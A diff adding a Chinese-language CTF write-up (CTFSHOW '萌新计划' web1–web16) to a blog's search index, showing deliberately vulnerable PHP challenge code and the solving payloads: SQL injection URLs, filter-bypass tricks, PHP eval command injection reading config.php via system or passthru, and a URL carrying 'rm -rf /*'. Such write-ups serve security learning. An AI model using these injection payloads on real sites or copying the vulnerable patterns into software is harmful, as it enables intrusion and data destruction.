@@ -1,6 +1,123 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTFSHOW【萌新计划】Writeup</title>
+    <url>/CTF/writeup09/</url>
+    <content><![CDATA[<h2 id="萌新计划web1"><a class="markdownIt-Anchor" href="#萌新计划web1"></a> 【萌新计划】web1</h2>
+<p><strong>题目：</strong>  代码很安全，没有漏洞。<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 包含数据库连接文件</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    <span class="comment"># 判断id的值是否大于999</span></span><br><span class="line">    <span class="keyword">if</span>(intval($id) &gt; <span class="number">999</span>)&#123;</span><br><span class="line">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"id error"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        $sql = <span class="string">"select * from article where id = $id order by id limit 1 "</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"执行的sql为：$sql&lt;br&gt;"</span>;</span><br><span class="line">        <span class="comment"># 执行sql 语句</span></span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        <span class="comment"># 判断有没有查询结果</span></span><br><span class="line">        <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span><br><span class="line">            <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"id: "</span> . $row[<span class="string">"id"</span>]. <span class="string">" - title: "</span> . $row[<span class="string">"title"</span>]. <span class="string">" &lt;br&gt;&lt;hr&gt;"</span> . $row[<span class="string">"content"</span>]. <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 关闭数据库连接</span></span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = <span class="number">1000</span> --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>提示flag在id=1000，可是id不能等于1000，构造如下url</p>
+<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">https://71233d4d-e0f8<span class="string">-4</span>cba<span class="string">-92</span>ba<span class="string">-8</span>f77a48f607b.chall.ctf.show/?id=100 or id=1000</span><br></pre></td></tr></table></figure>
+<p>得到flag，flag{6f5ec2a3-67f5-45c7-ad53-b725b1107435}</p>
+<p><img src="https://img-blog.csdnimg.cn/20200516213954273.png#pic_center" alt="在这里插入图片描述" /></p>
+<h2 id="萌新计划web2"><a class="markdownIt-Anchor" href="#萌新计划web2"></a> 【萌新计划】web2</h2>
+<p><strong>题目：</strong>  管理员赶紧修补了漏洞，这下应该没问题了吧？<br />
+<strong>解题思路：</strong> 题目代码和上一题相似，不过过滤了or</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/or|\+/i"</span>,$id))</span><br></pre></td></tr></table></figure>
+<p>构造如下url</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//2313fea2-de54-48db-b262-3dc6b0fb012f.chall.ctf.show/?id=100 || id=1000</span></span><br></pre></td></tr></table></figure>
+<p>得到flag，flag{9dfca7d9-e325-4ed8-9cfe-73c3d3aeacc9}。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200516214008610.PNG#pic_center" alt="在这里插入图片描述" /></p>
+<h2 id="萌新计划web3"><a class="markdownIt-Anchor" href="#萌新计划web3"></a> 【萌新计划】web3</h2>
+<p><strong>题目：</strong>  管理员被狠狠的教育了，所以决定好好修复一番。这次没问题了。<br />
+<strong>解题思路：</strong> 题目代码增加了过滤符号</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i"</span>,$id))&#123;</span><br></pre></td></tr></table></figure>
+<p>构造与上一题相同url即可，flag{41918340-c0cd-4792-98a3-52f0294262e0}。</p>
+<h2 id="萌新计划web4"><a class="markdownIt-Anchor" href="#萌新计划web4"></a> 【萌新计划】web4</h2>
+<p><strong>题目：</strong>  管理员阿呆又失败了，这次一定要堵住漏洞<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i"</span>,$id))</span><br></pre></td></tr></table></figure>
+<p>构造与上一题相同url即可，flag{4a5d7186-6d01-4425-8930-273e60cef3b9}。</p>
+<h2 id="萌新计划web5"><a class="markdownIt-Anchor" href="#萌新计划web5"></a> 【萌新计划】web5</h2>
+<p><strong>题目：</strong>  阿呆被老板狂骂一通，决定改掉自己大意的毛病，痛下杀手，修补漏洞。<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\'|\"|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i"</span>,$id))</span><br></pre></td></tr></table></figure>
+<p>利用字节操作，构造url</p>
+<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">https://<span class="number">34372a31</span>-<span class="number">4e08-4272</span>-<span class="number">8</span>c76-ad<span class="number">83b58f8a09</span>.chall.ctf.show/?id=~~<span class="number">1000</span></span><br></pre></td></tr></table></figure>
+<p>得到flag，flag{7557dd2b-8ad5-4237-a42b-65428442a02a}。</p>
+<h2 id="萌新计划web6"><a class="markdownIt-Anchor" href="#萌新计划web6"></a> 【萌新计划】web6</h2>
+<p><strong>题目：</strong>  阿呆一口老血差点噎死自己，决定杠上了<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\'|\"|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i"</span>,$id))</span><br></pre></td></tr></table></figure>
+<p>构造与上一题相同url，得到flag，flag{82754c8a-2429-4be9-9420-aa9d5152c44a}。</p>
+<h2 id="萌新计划web7"><a class="markdownIt-Anchor" href="#萌新计划web7"></a> 【萌新计划】web7</h2>
+<p><strong>题目：</strong>  阿呆得到最高指示，如果还出问题，就卷铺盖滚蛋，阿呆心在流血。<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\'|\"|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i"</span>,$id))</span><br></pre></td></tr></table></figure>
+<p>利用进制转换，构造如下url</p>
+<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">https://dfb305c2-9c40-<span class="number">4b41</span>-<span class="number">8912</span>-ae008639c5f0.chall.ctf.<span class="built_in">show</span>/?id=<span class="number">0b001111101000</span></span><br></pre></td></tr></table></figure>
+<p>得到flag，flag{2a0d2647-60b2-4025-bfa2-646c017b0c45}。</p>
+<h2 id="萌新计划web8"><a class="markdownIt-Anchor" href="#萌新计划web8"></a> 【萌新计划】web8</h2>
+<p><strong>题目：</strong>  阿呆熟悉的一顿操作，去了埃塞尔比亚。PS:阿呆第一季完，敬请期待第二季！<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 包含数据库连接文件,key flag 也在里面定义</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">                $f = $_GET[<span class="string">'flag'</span>];</span><br><span class="line">                <span class="keyword">if</span>($key===$f)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> $flag;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>看了WP听说是个梗题，构造url</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>ecaff87a-<span class="number">1927</span>-<span class="number">4</span>a7d-a6fd-b1141f41b4eb.chall.ctf.show<span class="regexp">/?flag=rm -rf /</span>*</span><br></pre></td></tr></table></figure>
+<p>得到flag{95d1ec7d-fd01-4dcf-ba44-e5af04047b4f} 。</p>
+<h2 id="萌新计划web9"><a class="markdownIt-Anchor" href="#萌新计划web9"></a> 【萌新计划】web9</h2>
+<p><strong>题目：</strong>  阿呆在埃塞俄比亚终于找了一个网管的工作，闲暇时还能种点菜。<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/system|exec|highlight/i"</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"cmd error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>代码的意思是需要传递到参数c中包含<code>system|exec|highlight</code>,构造url</p>
+<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">https://1ec537c0<span class="string">-6558</span><span class="string">-4</span>ca2<span class="string">-93</span>ee<span class="string">-84</span>f1df366922.chall.ctf.show/?c=highlight_file("config.php");</span><br></pre></td></tr></table></figure>
+<p>得到flag{50686976-d892-4311-851f-41de75510df5}。<strong>注意：一定要加分号</strong>。</p>
+<h2 id="萌新计划web10"><a class="markdownIt-Anchor" href="#萌新计划web10"></a> 【萌新计划】web10</h2>
+<p><strong>题目：</strong>  阿呆看见对面二黑急冲冲的跑过来，告诉阿呆出大事了，阿呆问什么事，二黑说：这几天天旱，你菜死了！<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight/i"</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"cmd error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用PHP语法多次定义，拼凑payload<code>c=$x='sys';$y='tem';$z=$x.$y;$z('cat config.php');</code><br />
+跳转到新页面后，查看源码，得到flag{78d9c590-10ad-4f0f-a9a5-58d13841192b}。</p>
+<h2 id="萌新计划web11"><a class="markdownIt-Anchor" href="#萌新计划web11"></a> 【萌新计划】web11</h2>
+<p><strong>题目：</strong>  阿呆听完自己菜死了，自己呆了。决定修好漏洞，绝对不能让自己再菜死了。<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight|cat/i"</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"cmd error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>过滤了cat，使用more替换即可<br />
+<code>c=$a='sys';$b='tem';$z=$a.$b;$z('more config.php');</code><br />
+得到flag{c856bc45-bb4e-4f57-8f55-93317f7cddf0}。</p>
+<h2 id="萌新计划web12"><a class="markdownIt-Anchor" href="#萌新计划web12"></a> 【萌新计划】web12</h2>
+<p><strong>题目：</strong>  阿呆不慌不忙的拔掉自己所有的菜，以后自己就不会菜死了。<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight|cat|\.|php|config/i"</span>,$c))</span><br></pre></td></tr></table></figure>
+<p>又过滤了文件名，利用base64编解码，拼凑payload <code>c=$a=base64_decode(&quot;c3lzdGVt&quot;);$b=base64_decode(&quot;Y2F0IGNvbmZpZy5waHA=&quot;);$a($b);</code><br />
+跳转到新页面后，查看源码，得到flag{33d9febb-c2dd-4b32-ad1b-f554c45e9052}。</p>
+<h2 id="萌新计划web13"><a class="markdownIt-Anchor" href="#萌新计划web13"></a> 【萌新计划】web13</h2>
+<p><strong>题目：</strong>  阿呆彻底呆了，阿呆拿起谷姐搜索好久，终于找到更狠的方法。<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight|cat|\.|\;|file|php|config/i"</span>,$c))</span><br></pre></td></tr></table></figure>
+<p>在之前题目的基础上过滤了分号，只能执行一条语句，想到PHP中的命令执行函数还可以用<code>passthru()</code>，可以使用<code>?&gt;</code>闭合语句。<br />
+拼凑payload<code>c=passthru('ca&quot;&quot;t</code>ls<code>')?&gt;</code>。<strong>注意：ls两边的是反引号。</strong><br />
+在linux中反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。<br />
+cat <code>ls</code> 相当于将 ls出来的结果cat。<br />
+跳转到新页面后，查看源码，得到flag{5da91d85-c854-4d5f-a725-d19caa9963c2}。</p>
+<h2 id="萌新计划web14"><a class="markdownIt-Anchor" href="#萌新计划web14"></a> 【萌新计划】web14</h2>
+<p><strong>题目：</strong>  阿呆忍无可忍了，告诉自己，如果还被攻，自己就跳下去。<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/system|exec|highlight|cat|\(|\.|\;|file|php|config/i"</span>,$c))</span><br></pre></td></tr></table></figure>
+<p>在之前题目的基础上过滤了括号，拼凑payload<code>c=echo \</code>$_POST[a]`?&gt;<code>，以post方式传入</code>a=cat config.php`，<br />
+得到flag{a90662b0-d0d4-43b1-ae28-9248dc8e4676}。</p>
+<h2 id="萌新计划web15"><a class="markdownIt-Anchor" href="#萌新计划web15"></a> 【萌新计划】web15</h2>
+<p><strong>题目：</strong>  人为什么要活着？难道埃塞俄比亚再无我阿呆容身之处？<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i"</span>,$c))</span><br></pre></td></tr></table></figure>
+<p>在之前题目的基础上过滤了问号，但未过滤分号，拼凑payload<code>c=echo \</code>$_POST[a]`;<code>，以post方式传入</code>a=cat config.php`，<br />
+得到flag{3178e80f-3ea6-433f-ba6f-0a9307c93da1}。</p>
+<h2 id="萌新计划web16"><a class="markdownIt-Anchor" href="#萌新计划web16"></a> 【萌新计划】web16</h2>
+<p><strong>题目：</strong>  阿呆为了自己的梦想(fulage)，决定来一波反向跑路。<br />
+<strong>解题思路：</strong> 题目代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="string">"ctfshow$c"</span>)===<span class="string">"a6f57ae38a22448c2f07f3f95f49c84e"</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"nonono!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上脚本爆破，得到c=36d。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> str1:</span><br><span class="line">            s = hashlib.md5((<span class="string">'ctfshow'</span>+i+j+k).encode()).hexdigest()</span><br><span class="line">            <span class="comment">#print(type(s))</span></span><br><span class="line">            <span class="keyword">if</span> s==<span class="string">'a6f57ae38a22448c2f07f3f95f49c84e'</span>:</span><br><span class="line">                print(i+j+k)</span><br></pre></td></tr></table></figure>
+<p>拼凑payload，得到flag{790f7029-1a66-4b2c-99c2-e912bfa8ed3d} 。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP反序列化漏洞</title>
     <url>/WEB%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p><h1><a name="t0"></a><a id="PHP_0"></a>PHP反序列化漏洞</h1></p>
